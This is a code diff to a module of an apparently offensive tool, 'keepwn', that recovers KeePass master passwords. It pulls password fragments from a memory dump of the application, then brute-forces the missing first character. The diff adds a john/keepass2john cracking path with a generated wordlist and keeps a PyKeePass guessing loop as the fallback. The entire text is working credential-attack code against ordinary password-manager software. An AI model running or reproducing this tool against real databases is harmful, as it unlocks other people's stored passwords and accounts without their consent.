@@ -1,6 +1,8 @@
-
-import itertools
+import re
 import os
+import itertools
+import subprocess
+import tempfile
 from os.path import exists
 from pykeepass import PyKeePass
 from pykeepass.exceptions import CredentialsError
@@ -10,6 +12,15 @@ from termcolor import colored
 
 from keepwn.utils.logging import Loader, print_error, print_info, print_success, print_warning
 
+def is_keepass_db_johnable():
+    try:
+        johnResult = subprocess.run(["john"], capture_output=True)
+        keepassTwoJohnResult = subprocess.run(["keepass2john"], capture_output=True)
+
+    except:
+        return False
+
+    return (johnResult.returncode == 0 and (keepassTwoJohnResult.returncode == 1 and b'Usage: keepass2john' in keepassTwoJohnResult.stderr))
 
 def get_candidates(dump_file): # code taken from @CMEPW: https://github.com/CMEPW/keepass-dump-masterkey
     data = dump_file.read()
@@ -22,7 +33,7 @@ def get_candidates(dump_file): # code taken from @CMEPW: https://github.com/CMEP
             str_len += 1
             i += 1
         elif str_len > 0:
-            if (data[i] >= 0x20) and (data[i] <= 0x7E) and (data[i + 1] == 0x00):
+            if (data[i] >= 0x20) and (data[i] <= 0xF8) and (data[i + 1] == 0x00):
                 candidate = (str_len * b'\xCF\x25') + bytes([data[i], data[i + 1]])
                 if not candidate in candidates:
                     candidates.append(candidate)
@@ -101,24 +112,52 @@ def parse_dump(options):
 
     found = False
     with Loader("Bruteforcing missing symbol with the 254 most common unicode characters..", end="Bruteforcing missing symbol with the 254 most common unicode characters.. done!") as loader:
-        for char_code in range(0x0000, 0x00FF + 1): # unicode's Basic Latin and Latin-1 Supplement blocks
-            try:
-                char = repr(chr(char_code))[1:-1]  # we make sure to get the escaped version of chars
-            except UnicodeEncodeError:
-                pass  # skip characters that cannot be encoded
+        # If john and keepass2john binaries are installed, use those as they are much quicker, otherwise fallback to PyKeePass method
+        if is_keepass_db_johnable():
+            hashfile = tempfile.NamedTemporaryFile(delete=False)
+            wordlist = tempfile.NamedTemporaryFile(delete=False)
+            basename = os.path.basename(database_path).split('.')[0]
 
             for candidate in candidates:
-                current_try = char + candidate
+                for char_code in range(0x0000, 0x00FF + 1):
+                    try:
+                        char = repr(chr(char_code))[1:-1]  # we make sure to get the escaped version of chars
+                    except UnicodeEncodeError:
+                        pass  # skip characters that cannot be encoded
+                    wordlist.write(bytes(char + candidate + "\n", "utf-8"))
+            wordlist.close()
+
+            subprocess.run(["keepass2john", database_path], stdout=hashfile)
+            hashfile.close()
+
+            bf_result = subprocess.run(["john", "--wordlist=" + wordlist.name, hashfile.name], capture_output=True, universal_newlines=True)
+            if bf_result.returncode == 0 and ('(' + basename + ')' in bf_result.stdout):
+                regex = r'(.*)? \(' + re.escape(basename) + r'\)'
+                current_try = re.search(regex, bf_result.stdout).group(1)
+                found = True
+
+            os.unlink(hashfile.name)
+            os.unlink(wordlist.name)
+
+        else:
+            for char_code in range(0x0000, 0x00FF + 1): # unicode's Basic Latin and Latin-1 Supplement blocks
                 try:
-                    kp = PyKeePass(database_path, password=current_try)
-                except CredentialsError:
-                    pass
-                else:
-                    found = True
-                    break
-            else: # to escape the nested loops, see: https://stackoverflow.com/questions/653509/breaking-out-of-nested-loops
-                continue
-            break
+                    char = repr(chr(char_code))[1:-1]  # we make sure to get the escaped version of chars
+                except UnicodeEncodeError:
+                    pass  # skip characters that cannot be encoded
+
+                for candidate in candidates:
+                    current_try = char + candidate
+                    try:
+                        kp = PyKeePass(database_path, password=current_try)
+                    except CredentialsError:
+                        pass
+                    else:
+                        found = True
+                        break
+                else: # to escape the nested loops, see: https://stackoverflow.com/questions/653509/breaking-out-of-nested-loops
+                    continue
+                break
 
     if found:
         print_success('{} successfully unlocked using master password {}'.format(os.path.basename(database_path), colored(current_try, 'green')))
